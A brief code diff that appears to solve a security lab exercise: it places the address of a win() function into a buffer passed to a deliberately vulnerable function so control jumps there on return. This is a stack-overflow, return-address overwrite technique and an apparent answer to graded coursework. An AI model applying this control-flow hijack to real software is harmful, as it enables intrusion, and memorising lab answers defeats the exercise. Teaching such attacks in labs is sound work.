@@ -35,6 +35,6 @@ void lab_code() {
 	your_string[127] = 0x000000000000000A;
 
 	// Part 2A: Fill in your_string such that vulnerable executes win() on exit
-
+	your_string[3] = win_address;
 	vulnerable((char *)your_string);
 }
